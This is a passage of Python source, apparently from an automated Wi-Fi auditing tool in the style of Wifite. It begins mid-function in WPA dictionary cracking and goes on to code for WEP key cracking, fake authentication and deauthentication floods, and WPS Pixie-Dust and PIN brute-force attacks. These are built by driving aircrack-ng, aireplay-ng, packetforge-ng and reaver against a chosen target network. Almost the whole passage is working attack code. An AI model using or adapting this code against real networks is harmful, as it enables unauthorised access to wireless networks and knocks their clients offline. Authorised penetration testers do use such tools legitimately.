                    RUN_CONFIG.save_cracked(t)

                    print_green(GR + '\n [+]' + W + ' Cracked %s (%s)!' % (G + capfile.ssid + W, G + capfile.bssid + W))
                    print_green(GR + ' [+]' + W + ' Key:    "%s"\n' % (C + key + W))
                    cracked = True
                else:
                    # Did not crack
                    print_red(R + '\n [!]' + R + 'Crack Attempt Failed' + O + ': Passphrase Not In Dictionary' + W)
                break

            inf = open(RUN_CONFIG.temp + 'out.out', 'r')
            lines = inf.read().split('\n')
            inf.close()
            outf = open(RUN_CONFIG.temp + 'out.out', 'w')
            outf.close()
            for line in lines:
                i = line.find(']')
                j = line.find('Keys Tested', i)
                if i != -1 and j != -1:
                    kts = line[i + 2:j - 1]
                    try:
                        kt = int(kts)
                    except ValueError:
                        pass
                i = line.find('(')
                j = line.find('k/s)', i)
                if i != -1 and j != -1:
                    kpss = line[i + 1:j - 1]
                    try:
                        kps = float(kpss)
                    except ValueError:
                        pass

            print("\r %s %s Keys Tested (%s%.2f keys/sec%s)   " % \
                  (GR + sec_to_hms(time.time() - start_time) + W, G + add_commas(kt) + W, G, kps, W), end=' ')
            stdout.flush()

    except KeyboardInterrupt:
        print_red(R + '\n (^C)' + O + ' WPA Cracking Interrupted' + W)

    send_interrupt(proc)
    try:
        os.kill(proc.pid, SIGTERM)
    except OSError:
        pass

    return cracked


def add_commas(n):
    """
        Receives integer n, returns string representation of n with commas in thousands place.
        I'm sure there's easier ways of doing this... but meh.
    """
    strn = str(n)
    lenn = len(strn)
    i = 0
    result = ''
    while i < lenn:
        if (lenn - i) % 3 == 0 and i != 0: result += ','
        result += strn[i]
        i += 1
    return result


#################
# WEP FUNCTIONS #
#################
class WEPAttack(Attack):
    def __init__(self, iface, target, clients, config):
        self.iface = iface
        self.target = target
        self.clients = clients
        self.RUN_CONFIG = config

    def RunAttack(self):
        '''
            Abstract method for dispatching the WEP crack
        '''
        self.attack_wep()

    def EndAttack(self):
        '''
            Abstract method for ending the WEP attack
        '''
        pass

    def attack_wep(self):
        """
        Attacks WEP-encrypted network.
        Returns True if key was successfully found, False otherwise.
        """
        if self.RUN_CONFIG.WEP_TIMEOUT <= 0: self.RUN_CONFIG.WEP_TIMEOUT = -1

        total_attacks = 6  # 4 + (2 if len(clients) > 0 else 0)
        if not self.RUN_CONFIG.WEP_ARP_REPLAY: total_attacks -= 1
        if not self.RUN_CONFIG.WEP_CHOPCHOP:   total_attacks -= 1
        if not self.RUN_CONFIG.WEP_FRAGMENT:   total_attacks -= 1
        if not self.RUN_CONFIG.WEP_CAFFELATTE: total_attacks -= 1
        if not self.RUN_CONFIG.WEP_P0841:      total_attacks -= 1
        if not self.RUN_CONFIG.WEP_HIRTE:      total_attacks -= 1

        if total_attacks <= 0:
            print_red(R + ' [!]' + O + ' Unable to initiate WEP attacks: no attacks are selected!')
            return False
        remaining_attacks = total_attacks

        print(' %s Preparing Attack "%s" (%s)' % \
              (GR + sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT) + W, G + self.target.ssid + W, G + self.target.bssid + W))

        file_prefix = os.path.join(self.RUN_CONFIG.temp, 'wep')
        wepkey_file = os.path.join(self.RUN_CONFIG.temp, 'wepkey.txt')
        csv_file = file_prefix + '-01.csv'
        cap_file = file_prefix + '-01.cap'

        remove_airodump_files(file_prefix)
        remove_file(wepkey_file)

        # Start airodump process to capture packets
        cmd_airodump = ['airodump-ng',
                        '-w', file_prefix,  # Output file name (wep-01.cap, wep-01.csv)
                        '-c', self.target.channel,  # Wireless channel
                        '--write-interval', '1',
                        '--bssid', self.target.bssid,
                        self.iface]
        proc_airodump = Popen(cmd_airodump, stdout=DN, stderr=DN)
        proc_aireplay = None
        proc_aircrack = None

        successful = False  # Flag for when attack is successful
        started_cracking = False  # Flag for when we have started aircrack-ng
        client_mac = ''  # The client mac we will send packets to/from

        total_ivs = 0
        ivs = 0
        last_ivs = 0
        for attack_num in range(0, 6):

            # Skip disabled attacks
            if attack_num == 0 and not self.RUN_CONFIG.WEP_ARP_REPLAY:
                continue
            elif attack_num == 1 and not self.RUN_CONFIG.WEP_CHOPCHOP:
                continue
            elif attack_num == 2 and not self.RUN_CONFIG.WEP_FRAGMENT:
                continue
            elif attack_num == 3 and not self.RUN_CONFIG.WEP_CAFFELATTE:
                continue
            elif attack_num == 4 and not self.RUN_CONFIG.WEP_P0841:
                continue
            elif attack_num == 5 and not self.RUN_CONFIG.WEP_HIRTE:
                continue

            remaining_attacks -= 1

            try:

                if self.wep_fake_auth(self.iface, self.target, sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT)):
                    # Successful fake auth
                    client_mac = self.RUN_CONFIG.THIS_MAC
                elif not self.RUN_CONFIG.WEP_IGNORE_FAKEAUTH:
                    send_interrupt(proc_aireplay)
                    send_interrupt(proc_airodump)
                    print_red(R + ' [!]' + O + ' Unable to fake-authenticate with target')
                    print(R + ' [!]' + O + ' To skip this speed bump, select "ignore-fake-auth" at command-line')
                    return False

                remove_file(os.path.join(self.RUN_CONFIG.temp, 'arp.cap'))
                # Generate the aireplay-ng arguments based on attack_num and other params
                cmd = self.get_aireplay_command(self.iface, attack_num, self.target, self.clients, client_mac)
                if cmd == '': continue
                if proc_aireplay != None:
                    send_interrupt(proc_aireplay)
                proc_aireplay = Popen(cmd, stdout=PIPE, stderr=PIPE)

                print('\r %s attacking "%s" via' % (
                GR + sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT) + W, G + self.target.ssid + W), end=' ')
                if attack_num == 0:
                    print(G + 'arp-replay', end=' ')
                elif attack_num == 1:
                    print(G + 'chop-chop', end=' ')
                elif attack_num == 2:
                    print(G + 'fragmentation', end=' ')
                elif attack_num == 3:
                    print(G + 'caffe-latte', end=' ')
                elif attack_num == 4:
                    print(G + 'p0841', end=' ')
                elif attack_num == 5:
                    print(G + 'hirte', end=' ')
                print('attack' + W)

                print(' %s Captured %s%d%s ivs @ %s iv/sec' % (
                GR + sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT) + W, G, total_ivs, W, G + '0' + W), end=' ')
                stdout.flush()

                time.sleep(1)
                if attack_num == 1:
                    # Send a deauth packet to broadcast and all clients *just because!*
                    self.wep_send_deauths(self.iface, self.target, self.clients)
                last_deauth = time.time()

                replaying = False
                time_started = time.time()
                while time.time() - time_started < self.RUN_CONFIG.WEP_TIMEOUT:
                    # time.sleep(5)
                    if self.RUN_CONFIG.WEP_TIMEOUT == -1:
                        current_hms = "[Endless]"
                    else:
                        current_hms = sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT - (time.time() - time_started))
                    print("\r %s\r" % (GR + current_hms + W), end=' ')
                    stdout.flush()
                    time.sleep(1)

                    # Calculates total seconds remaining

                    # Check number of IVs captured
                    csv = self.RUN_CONFIG.RUN_ENGINE.parse_csv(csv_file)[0]
                    if len(csv) > 0:
                        ivs = int(csv[0].data)
                        print("\r                                                   ", end=' ')
                        print("\r %s captured %s%d%s ivs @ %s%d%s iv/sec" % \
                              (GR + current_hms + W, G, total_ivs + ivs, W, G, (ivs - last_ivs), W), end=' ')

                        if ivs - last_ivs == 0 and time.time() - last_deauth > 30:
                            print("\r %s Feauthing to generate packets..." % (GR + current_hms + W), end=' ')
                            self.wep_send_deauths(self.iface, self.target, self.clients)
                            print_green("Done\r", end=' ')
                            last_deauth = time.time()

                        last_ivs = ivs
                        stdout.flush()
                        if total_ivs + ivs >= self.RUN_CONFIG.WEP_CRACK_AT_IVS and not started_cracking:
                            # Start cracking
                            cmd = ['aircrack-ng',
                                   '-a', '1',
                                   '-l', wepkey_file]
                            #temp + 'wep-01.cap']
                            # Append all .cap files in temp directory (in case we are resuming)
                            for f in os.listdir(self.RUN_CONFIG.temp):
                                if f.startswith('wep-') and f.endswith('.cap'):
                                    cmd.append(os.path.join(self.RUN_CONFIG.temp, f))

                            print("\r %s Started %s (%sOver %d ivs%s)" % (
                            GR + current_hms + W, G + 'Cracking' + W, G, self.RUN_CONFIG.WEP_CRACK_AT_IVS, W))
                            proc_aircrack = Popen(cmd, stdout=DN, stderr=DN)
                            started_cracking = True

                    # Check if key has been cracked yet.
                    if os.path.exists(wepkey_file):
                        # Cracked!
                        infile = open(wepkey_file, 'r')
                        key = infile.read().replace('\n', '')
                        infile.close()
                        print_green('\n\n %s %s %s (%s)! Key: "%s"' % (
                        current_hms, G + 'Cracked', self.target.ssid + W, G + self.target.bssid + W, C + key + W))
                        self.RUN_CONFIG.WEP_FINDINGS.append(
                            'Cracked %s (%s), Key: "%s"' % (self.target.ssid, self.target.bssid, key))
                        self.RUN_CONFIG.WEP_FINDINGS.append('')

                        t = Target(self.target.bssid, 0, 0, 0, 'WEP', self.target.ssid)
                        t.key = key
                        self.RUN_CONFIG.save_cracked(t)

                        # Kill processes
                        send_interrupt(proc_airodump)
                        send_interrupt(proc_aireplay)
                        try:
                            os.kill(proc_aireplay, SIGTERM)
                        except:
                            pass
                        send_interrupt(proc_aircrack)
                        # Remove files generated by airodump/aireplay/packetforce
                        time.sleep(0.5)
                        remove_airodump_files(file_prefix)
                        remove_file(wepkey_file)
                        return True

                    # Check if aireplay is still executing
                    if proc_aireplay.poll() == None:
                        if replaying:
                            print(', ' + G + 'Replaying         \r' + W, end=' ')
                        elif attack_num == 1 or attack_num == 2:
                            print(', Waiting for packet    \r', end=' ')
                        stdout.flush()
                        continue

                    # At this point, aireplay has stopped
                    if attack_num != 1 and attack_num != 2:
                        print_red('\r %s Attack Failed: %sAireplay-ng Exited Unexpectedly%s' % (R + current_hms, O, W))
                        (sout, serr) = proc_aireplay.communicate()
                        break  # Break out of attack's While loop

                    # Check for a .XOR file (we expect one when doing chopchop/fragmentation
                    xor_file = ''
                    for filename in sorted(os.listdir(self.RUN_CONFIG.temp)):
                        if filename.lower().endswith('.xor'):
                            xor_file = os.path.join(self.RUN_CONFIG.temp, filename)
                    if xor_file == '':
                        print_red('\r %s Attack Failed: %sUnable To Generate Keystream        %s' % (R + current_hms, O, W))
                        break

                    remove_file(os.path.join(self.RUN_CONFIG.temp, 'arp.cap'))
                    cmd = ['packetforge-ng',
                           '-0',
                           '-a', self.target.bssid,
                           '-h', client_mac,
                           '-k', '192.168.1.2',
                           '-l', '192.168.1.100',
                           '-y', xor_file,
                           '-w', os.path.join(self.RUN_CONFIG.temp, 'arp.cap'),
                           self.iface]
                    proc_pforge = Popen(cmd, stdout=PIPE, stderr=DN)
                    proc_pforge.wait()
                    forged_packet = proc_pforge.communicate()[0]
                    remove_file(xor_file)
                    if forged_packet == None: result = ''
                    forged_packet = forged_packet.strip()
                    if not forged_packet.find('Wrote Packet'):
                        print_red("\r %s Attack Failed: Unable To Forget ARP Packet               %s" % (
                        R + current_hms + O, W))
                        break

                    # We were able to forge a packet, so let's replay it via aireplay-ng
                    cmd = ['aireplay-ng',
                           '--ignore-negative-one',
                           '--arpreplay',
                           '-b', self.target.bssid,
                           '-r', os.path.join(self.RUN_CONFIG.temp, 'arp.cap'),  # Used the forged ARP packet
                           '-F',  # Select the first packet
                           self.iface]
                    proc_aireplay = Popen(cmd, stdout=DN, stderr=DN)

                    print('\r %s forged %s! %s...         ' % (
                    GR + current_hms + W, G + 'arp packet' + W, G + 'replaying' + W))
                    replaying = True

                # After the attacks, if we are already cracking, wait for the key to be found!
                while started_cracking:  # ivs > WEP_CRACK_AT_IVS:
                    time.sleep(1)
                    # Check number of IVs captured
                    csv = self.RUN_CONFIG.RUN_ENGINE.parse_csv(csv_file)[0]
                    if len(csv) > 0:
                        ivs = int(csv[0].data)
                        print(GR + " [Endless]" + W + " Captured %s%d%s ivs, iv/sec: %s%d%s  \r" % \
                                                      (G, total_ivs + ivs, W, G, (ivs - last_ivs), W), end=' ')
                        last_ivs = ivs
                        stdout.flush()

                    # Check if key has been cracked yet.
                    if os.path.exists(wepkey_file):
                        # Cracked!
                        infile = open(wepkey_file, 'r')
                        key = infile.read().replace('\n', '')
                        infile.close()
                        print_green(GR + '\n\n [endless] %s %s (%s)! Key: "%s"' % (
                        G + 'Cracked', self.target.ssid + W, G + self.target.bssid + W, C + key + W))
                        self.RUN_CONFIG.WEP_FINDINGS.append(
                            'Cracked %s (%s), Key: "%s"' % (self.target.ssid, self.target.bssid, key))
                        self.RUN_CONFIG.WEP_FINDINGS.append('')

                        t = Target(self.target.bssid, 0, 0, 0, 'WEP', self.target.ssid)
                        t.key = key
                        self.RUN_CONFIG.save_cracked(t)

                        # Kill processes
                        send_interrupt(proc_airodump)
                        send_interrupt(proc_aireplay)
                        send_interrupt(proc_aircrack)
                        # Remove files generated by airodump/aireplay/packetforce
                        remove_airodump_files(file_prefix)
                        remove_file(wepkey_file)
                        return True

            # Keyboard interrupt during attack
            except KeyboardInterrupt:
                print_red(R + '\n (^C)' + O + ' WEP Attack Interrupted\n' + W)

                send_interrupt(proc_airodump)
                if proc_aireplay != None:
                    send_interrupt(proc_aireplay)
                if proc_aircrack != None:
                    send_interrupt(proc_aircrack)

                options = []
                selections = []
                if remaining_attacks > 0:
                    options.append('%sContinue%s Attacking This Target (%d Remaining WEP Attack%s)' % \
                                   (G, W, (remaining_attacks), 's' if remaining_attacks != 1 else ''))
                    selections.append(G + 'c' + W)

                if self.RUN_CONFIG.TARGETS_REMAINING > 0:
                    options.append('%sskip%s     This target, move onto next target (%d remaining target%s)' % \
                                   (O, W, self.RUN_CONFIG.TARGETS_REMAINING,
                                    's' if self.RUN_CONFIG.TARGETS_REMAINING != 1 else ''))
                    selections.append(O + 's' + W)

                options.append('%sexit%s     The program completed.' % (R, W))
                selections.append(R + 'e' + W)

                if len(options) > 1:
                    # Ask user what they want to do, Store answer in "response"
                    print(GR + ' [+]' + W + ' What do you want to do?')
                    response = ''
                    while response != 'c' and response != 's' and response != 'e':
                        for option in options:
                            print('     %s' % option)
                        response = input(
                            GR + ' [+]' + W + ' Please Make a Selection (%s): ' % (', '.join(selections))).lower()[0]
                else:
                    response = 'e'

                if response == 'e' or response == 's':
                    # Exit or skip target (either way, stop this attack)
                    if self.RUN_CONFIG.WEP_SAVE:
                        # Save packets
                        save_as = re.sub(r'[^a-zA-Z0-9]', '', self.target.ssid) + '_' + self.target.bssid.replace(':',
                                                                                                                  '-') + '.cap' + W
                        try:
                            rename(cap_file, save_as)
                        except OSError:
                            print_red(R + ' [!]' + O + ' Unable to save capture file!' + W)
                        else:
                            print_green(GR + ' [+]' + W + ' Packet capture ' + G + 'saved' + W + ' to ' + G + save_as + W)

                    # Remove files generated by airodump/aireplay/packetforce
                    for filename in os.listdir('.'):
                        if filename.startswith('replay_arp-') and filename.endswith('.cap'):
                            remove_file(filename)
                    remove_airodump_files(file_prefix)
                    remove_file(wepkey_file)
                    print('')
                    if response == 'e':
                        self.RUN_CONFIG.exit_gracefully(0)
                    return

                elif response == 'c':
                    # Continue attacks
                    # Need to backup temp/wep-01.cap and remove airodump files
                    i = 2
                    while os.path.exists(os.path.join(self.RUN_CONFIG.temp, 'wep-' + str(i) + '.cap')):
                        i += 1
                    new_cap_file = os.path.join(self.RUN_CONFIG.temp, 'wep-' + str(i) + '.cap')
                    copy(cap_file, new_cap_file)
                    remove_airodump_files(file_prefix)

                    # Need to restart airodump-ng, as it's been interrupted/killed
                    proc_airodump = Popen(cmd_airodump, stdout=DN, stderr=DN)

                    # Say we haven't started cracking yet, so we re-start if needed.
                    started_cracking = False

                    # Reset IVs counters for proper behavior
                    total_ivs += ivs
                    ivs = 0
                    last_ivs = 0

                    # Also need to remember to crack "temp/*.cap" instead of just wep-01.cap
                    pass

        if successful:
            print_green(GR + '\n [0:00:00]' + W + ' Attack Complete: ' + G + 'Success!' + W)
        else:
            print_red(GR + '\n [0:00:00]' + W + ' Attack Complete: ' + R + 'Failure!' + W)

        send_interrupt(proc_airodump)
        if proc_aireplay != None:
            send_interrupt(proc_aireplay)

        # Remove files generated by airodump/aireplay/packetforce
        for filename in os.listdir('.'):
            if filename.startswith('replay_arp-') and filename.endswith('.cap'):
                remove_file(filename)
        remove_airodump_files(file_prefix)
        remove_file(wepkey_file)

    def wep_fake_auth(self, iface, target, time_to_display):
        """
            Attempt to (falsely) authenticate with a WEP access point.
            Gives 3 seconds to make each 5 authentication attempts.
            Returns True if authentication was successful, False otherwise.
        """
        max_wait = 3  # Time, in seconds, to allow each fake authentication
        max_attempts = 5  # Number of attempts to make

        for fa_index in range(1, max_attempts + 1):
            print('\r                                                            ', end=' ')
            print_red('\r %s Attempting %sFake Authentication%s (%d/%d)... ' % \
                  (GR + time_to_display + W, G, W, fa_index, max_attempts), end=' ')
            stdout.flush()

            cmd = ['aireplay-ng',
                   '--ignore-negative-one',
                   '-1', '0',  # Fake auth, no delay
                   '-a', target.bssid,
                   '-T', '1']  # Make 1 attempt
            if target.ssid != '':
                cmd.append('-e')
                cmd.append(target.ssid)
            cmd.append(iface)

            proc_fakeauth = Popen(cmd, stdout=PIPE, stderr=DN)
            started = time.time()
            while proc_fakeauth.poll() == None and time.time() - started <= max_wait:
                time.sleep(0.1)

            if time.time() - started > max_wait:
                send_interrupt(proc_fakeauth)
                print_red(R + 'Failed! ' + W, end=' ')
                stdout.flush()
                time.sleep(0.5)
                continue

            result = proc_fakeauth.communicate()[0].lower()
            if result.find('Switching to shared key') != -1 or \
                    result.find('Rejects open system'): pass
            if result.find('Association successful') != -1:
                print_green(G + 'Success!' + W)
                return True

            print(R + 'failed' + W, end=' ')
            stdout.flush()
            time.sleep(0.5)
            continue
        print('')
        return False

    def get_aireplay_command(self, iface, attack_num, target, clients, client_mac):
        """
            Returns aireplay-ng command line arguments based on parameters.
        """
        cmd = ''
        if attack_num == 0:
            cmd = ['aireplay-ng',
                   '--ignore-negative-one',
                   '--arpreplay',
                   '-b', target.bssid,
                   '-x', str(self.RUN_CONFIG.WEP_PPS)]  # Packets per second
            if client_mac != '':
                cmd.append('-h')
                cmd.append(client_mac)
            elif len(clients) > 0:
                cmd.append('-h')
                cmd.append(clients[0].bssid)
            cmd.append(iface)

        elif attack_num == 1:
            cmd = ['aireplay-ng',
                   '--ignore-negative-one',
                   '--chopchop',
                   '-b', target.bssid,
                   '-x', str(self.RUN_CONFIG.WEP_PPS),  # Packets per second
                   '-m', '60',  # Minimum packet length (bytes)
                   '-n', '82',  # Maxmimum packet length
                   '-F']  # Automatically choose the first packet
            if client_mac != '':
                cmd.append('-h')
                cmd.append(client_mac)
            elif len(clients) > 0:
                cmd.append('-h')
                cmd.append(clients[0].bssid)
            cmd.append(iface)

        elif attack_num == 2:
            cmd = ['aireplay-ng',
                   '--ignore-negative-one',
                   '--fragment',
                   '-b', target.bssid,
                   '-x', str(self.RUN_CONFIG.WEP_PPS),  # Packets per second
                   '-m', '100',  # Minimum packet length (bytes)
                   '-F']  # Automatically choose the first packet
            if client_mac != '':
                cmd.append('-h')
                cmd.append(client_mac)
            elif len(clients) > 0:
                cmd.append('-h')
                cmd.append(clients[0].bssid)
            cmd.append(iface)

        elif attack_num == 3:
            cmd = ['aireplay-ng',
                   '--ignore-negative-one',
                   '--caffe-latte',
                   '-b', target.bssid]
            if len(clients) > 0:
                cmd.append('-h')
                cmd.append(clients[0].bssid)
            cmd.append(iface)

        elif attack_num == 4:
            cmd = ['aireplay-ng', '--ignore-negative-one', '--interactive', '-b', target.bssid, '-c',
                   'ff:ff:ff:ff:ff:ff', '-t', '1', '-x', str(self.RUN_CONFIG.WEP_PPS), '-F', '-p', '0841', iface]

        elif attack_num == 5:
            if len(clients) == 0:
                print(R + ' [0:00:00] unable to carry out hirte attack: ' + O + 'no clients')
                return ''
            cmd = ['aireplay-ng',
                   '--ignore-negative-one',
                   '--cfrag',
                   '-h', clients[0].bssid,
                   iface]

        return cmd

    def wep_send_deauths(self, iface, target, clients):
        """
            Sends deauth packets to broadcast and every client.
        """
        # Send deauth to broadcast
        cmd = ['aireplay-ng',
               '--ignore-negative-one',
               '--deauth', str(self.RUN_CONFIG.WPA_DEAUTH_COUNT),
               '-a', target.bssid,
               iface]
        call(cmd, stdout=DN, stderr=DN)
        # Send deauth to every client
        for client in clients:
            cmd = ['aireplay-ng',
                   '--ignore-negative-one',
                   '--deauth', str(self.RUN_CONFIG.WPA_DEAUTH_COUNT),
                   '-a', target.bssid,
                   '-c', client.bssid,
                   iface]
            call(cmd, stdout=DN, stderr=DN)


#################
# WPS FUNCTIONS #
#################
class WPSAttack(Attack):
    def __init__(self, iface, target, config):
        self.iface = iface
        self.target = target
        self.RUN_CONFIG = config

    def RunAttack(self):
        '''
            Abstract method for initializing the WPS attack
        '''
        if self.is_pixie_supported():
            # Try the pixie-dust attack
            if self.attack_wps_pixie():
                # If it succeeds, stop
                return True

        # Drop out if user specified to run ONLY the pixie attack
        if self.RUN_CONFIG.PIXIE:
            return False

        # Try the WPS PIN attack
        return self.attack_wps()

    def EndAttack(self):
        '''
            Abstract method for ending the WPS attack
        '''
        pass

    def is_pixie_supported(self):
        '''
            Checks if current version of Reaver supports the pixie-dust attack
        '''
        p = Popen(['reaver', '-h'], stdout=DN, stderr=PIPE)
        stdout = p.communicate()[1]
        for line in stdout.split('\n'):
            if '--pixie-dust' in line:
                return True
        return False

    def attack_wps_pixie(self):
        """
            Attempts "Pixie WPS" attack which certain vendors
            susceptible to.
        """

        # TODO Check if the user's version of reaver supports the Pixie attack (1.5.2+, "mod by t6_x")
        #      If not, return False

        output_file = os.path.join(self.RUN_CONFIG.temp, 'out.out')
        pixie_file = os.path.join(self.RUN_CONFIG.temp, 'pixie.out')

        print(GR + ' [0:00:00]' + W + ' initializing %sWPS Pixie Attack%s on %s' % \
                                      (G, W, G + self.target.ssid + W + ' (' + G + self.target.bssid + W + ')' + W))
        cmd = ['reaver',
               '-i', self.iface,
               '-b', self.target.bssid,
               '-c', self.target.channel,
               '-K', '1', # Pixie WPS attack
               '-vv']  # verbose output

        # Redirect output to files
        outf = open(output_file, 'a')
        errf = open(pixie_file, 'a')

        # Start process
        proc = Popen(cmd, stdout=outf, stderr=errf)

        cracked = False  # Flag for when password/pin is found
        time_started = time.time()
        pin = ''
        key = ''

        try:
            while not cracked:
                time.sleep(1)
                errf.flush()
                if proc.poll() != None:
                    # Process stopped: Cracked? Failed?
                    errf.close()
                    inf = open(output_file, 'r')
                    lines = inf.read().split('\n')
                    inf.close()
                    for line in lines:
                        # Cracked: older pixiewps/reaver output
                        if line.find("WPS PIN: '") != -1:
                            pin = line[line.find("WPS PIN: '") + 10:-1]
                            cracked = True
                        if line.find("WPA PSK: '") != -1:
                            key = line[line.find("WPA PSK: '") + 10:-1]

                        # Cracked: Newer pixiewps output
                        if line.find("WPS pin:  ") != -1:
                            pin = line[line.find("WPS Pin:  ") + 10:]
                            cracked = True
                        if line.find("WPA PSK:  ") != -1:
                            key = line[line.find("WPA PSK:  ") + 10:]

                        # Failed:
                        if 'Pixie-Dust' in line and 'WPS pin not found' in line:
                            # PixieDust isn't possible on this router
                            print('\r %s WPS Pixie attack%s failed - WPS pin not found              %s' % (GR + sec_to_hms(time.time() - time_started) + G, R, W))
                            break
                    break

                # (Reaver is still running)

                print('\r %s WPS Pixie Attack:' % (GR + sec_to_hms(time.time() - time_started) + G), end=' ')

                # Check if there's an output file to parse
                if not os.path.exists(output_file): continue
                inf = open(output_file, 'r')
                lines = inf.read().split('\n')
                inf.close()

                output_line = ''
                for line in lines:
                    line = line.replace('[+]', '').replace('[!]', '').replace('\0', '').strip()
                    if line == '' or line == ' ' or line == '\t': continue
                    if len(line) > 50:
                        # Trim to a reasonable size
                        line = line[0:47] + '...'
                    output_line = line

                if 'Sending M2 message' in output_line:
                    # At this point in the Pixie attack, all output is via stderr
                    # We have to wait for the process to finish to see the result.
                    print(O, 'Sending M2 message (may take a while)...                   ', W, end=' ')
                elif output_line != '':
                    # Print the last message from reaver as a "status update"
                    print(C, output_line, W, ' ' * (50 - len(output_line)), end=' ')

                stdout.flush()

                # Clear out output file
                inf = open(output_file, 'w')
                inf.close()

            # End of big "while not cracked" loop
            if cracked:
                if pin != '':
                    print(GR + '\n\n [+]' + G + ' PIN found:     %s' % (C + pin + W))

                if key != '':
                    print_green(GR + ' [+] %sWPA Key Found:%s %s' % (G, W, C + key + W))
                else:
                    key = 'N/A'

                self.RUN_CONFIG.WPA_FINDINGS.append(W + "Found %s's WPA Key: \"%s\", WPS PIN: %s" % (
                G + self.target.ssid + W, C + key + W, C + pin + W))
                self.RUN_CONFIG.WPA_FINDINGS.append('')

                t = Target(self.target.bssid, 0, 0, 0, 'WPA', self.target.ssid)
                t.key = key
                t.wps = pin
                self.RUN_CONFIG.save_cracked(t)
            else:
                print(GR + '\n [+]' + R + ' Attack failed.' + W)

        except KeyboardInterrupt:
            print_red(R + '\n (^C)' + O + ' WPS Pixie Attack Interrupted' + W)
            if attack_interrupted_prompt():
                send_interrupt(proc)
                print('')
                self.RUN_CONFIG.exit_gracefully(0)

        send_interrupt(proc)

        # Delete the files
        if os.path.exists(output_file): os.remove(output_file)
        if os.path.exists(pixie_file): os.remove(pixie_file)

        return cracked


    def attack_wps(self):
        print(GR + ' [0:00:00]' + W + ' initializing %sWPS PIN attack%s on %s' % \
                                      (G, W, G + self.target.ssid + W + ' (' + G + self.target.bssid + W + ')' + W))

        output_file = os.path.join(self.RUN_CONFIG.temp, 'out.out')
        cmd = ['reaver',
               '-i', self.iface,
               '-b', self.target.bssid,
               '-o', output_file, 
               '-c', self.target.channel,
               '-vv']  
        proc = Popen(cmd, stdout=DN, stderr=DN)

        cracked = False  # Flag for when password/pin is found
        percent = 'x.xx%'  # Percentage complete
        aps = 'x'  # Seconds per attempt
        time_started = time.time()
        last_success = time_started  # Time of last successful attempt
        last_pin = ''  # Keep track of last pin tried (to detect retries)
        retries = 0  # Number of times we have attempted this PIN
        tries_total = 0  # Number of times we have attempted all pins
        tries = 0  # Number of successful attempts
        pin = ''
        key = ''

        try:
            while not cracked:
                time.sleep(1)

                if not os.path.exists(output_file): continue

                if proc.poll() != None:
                    # Process stopped: Cracked? Failed?
                    inf = open(output_file, 'r')
                    lines = inf.read().split('\n')
                    inf.close()
                    for line in lines:
                        # When it's cracked:
                        if line.find("WPS PIN: '") != -1:
                            pin = line[line.find("WPS PIN: '") + 10:-1]
                            cracked = True
                        if line.find("WPA PSK: '") != -1:
                            key = line[line.find("WPA PSK: '") + 10:-1]

                    break

                inf = open(output_file, 'r')
                lines = inf.read().split('\n')
                inf.close()

                for line in lines:
                    if line.strip() == '': continue
                    # Status
                    if line.find(' complete @ ') != -1 and len(line) > 8:
                        percent = line.split(' ')[1]
                        i = line.find(' (')
                        j = line.find(' seconds/', i)
                        if i != -1 and j != -1: aps = line[i + 2:j]
                    # PIN attempt
                    elif line.find(' Trying pin ') != -1:
                        pin = line.strip().split(' ')[-1]
                        if pin == last_pin:
                            retries += 1
                        elif tries_total == 0:
                            last_pin = pin
                            tries_total -= 1
                        else:
                            last_success = time.time()
                            tries += 1
                            last_pin = pin
                            retries = 0
                        tries_total += 1

                    # Warning
                    elif line.endswith('10 Failed Connections in a row'):
                        pass

                    # Check for PIN/PSK
                    elif line.find("WPS PIN: '") != -1:
                        pin = line[line.find("WPS PIN: '") + 10:-1]
                        cracked = True
                    elif line.find("WPA PSK: '") != -1:
                        key = line[line.find("WPA PSK: '") + 10:-1]
                    if cracked: break

                print(' %s WPS Attack, %s success/ttl,' % \
                      (GR + sec_to_hms(time.time() - time_started) + W, \
                       G + str(tries) + W + '/' + O + str(tries_total) + W), end=' ')

                if percent == 'x.xx%' and aps == 'x':
                    print('\r', end=' ')
                else:
                    print('%s Complete (%s sec/att)   \r' % (G + percent + W, G + aps + W), end=' ')

                if self.RUN_CONFIG.WPS_TIMEOUT > 0 and (time.time() - last_success) > self.RUN_CONFIG.WPS_TIMEOUT:
                    print_red(R + '\n [!]' + O + ' Unable to complete successful try in %d seconds' % (
                    self.RUN_CONFIG.WPS_TIMEOUT))
                    print_green(R + ' [+]' + W + ' Skipping %s' % (O + self.target.ssid + W))
                    break

                if self.RUN_CONFIG.WPS_MAX_RETRIES > 0 and retries > self.RUN_CONFIG.WPS_MAX_RETRIES:
                    print_red(R + '\n [!]' + O + ' Unable to complete successful try in %d retries' % (
                    self.RUN_CONFIG.WPS_MAX_RETRIES))
                    print_red(R + ' [+]' + O + ' The access point may have WPS-locking enabled, or is too far away' + W)
                    print(R + ' [+]' + W + ' Skipping %s' % (O + self.target.ssid + W))
                    break

                if self.RUN_CONFIG.WPS_RATIO_THRESHOLD > 0.0 and tries > 0 and (
                    float(tries) / tries_total) < self.RUN_CONFIG.WPS_RATIO_THRESHOLD:
                    print_red(R + '\n [!]' + O + ' Successful/Total Attempts Ratio Was Too Low (< %.2f)' % (
                    self.RUN_CONFIG.WPS_RATIO_THRESHOLD))
                    print(R + ' [+]' + W + ' Skipping %s' % (G + self.target.ssid + W))
                    break

                stdout.flush()
                # Clear out output file if bigger than 1mb
                inf = open(output_file, 'w')
                inf.close()

            # End of big "while not cracked" loop

            if cracked:
                if pin != '':
                    print(GR + '\n\n [+]' + G + ' PIN Found:     %s' % (C + pin + W))
                if key != '':
                    print_green(GR + ' [+] %sWPA Key Found:%s %s' % (G, W, C + key + W))
                else:
                    key = 'N/A'
                self.RUN_CONFIG.WPA_FINDINGS.append(W + "Found %s's WPA key: \"%s\", WPS PIN: %s" % (
                G + self.target.ssid + W, C + key + W, C + pin + W))
                self.RUN_CONFIG.WPA_FINDINGS.append('')

                t = Target(self.target.bssid, 0, 0, 0, 'WPA', self.target.ssid)
                t.key = key
                t.wps = pin
                self.RUN_CONFIG.save_cracked(t)

        except KeyboardInterrupt:
            print_red(R + '\n (^C)' + O + ' WPS Brute-Force Attack Interrupted' + W)
            if attack_interrupted_prompt():
                send_interrupt(proc)
                print('')
                self.RUN_CONFIG.exit_gracefully(0)

